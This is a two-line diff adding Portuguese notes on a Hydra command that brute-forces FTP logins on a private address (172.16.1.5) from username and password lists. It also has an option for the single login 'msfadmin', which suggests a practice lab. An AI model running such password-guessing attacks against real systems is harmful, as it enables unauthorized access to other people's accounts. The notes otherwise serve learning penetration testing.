@@ -1,0 +1,2 @@
+hydra -v -L login.txt -P passwd.txt 172.16.1.5 ftp #brute-force login e senha
+	 -l msfadmin # apenas um login
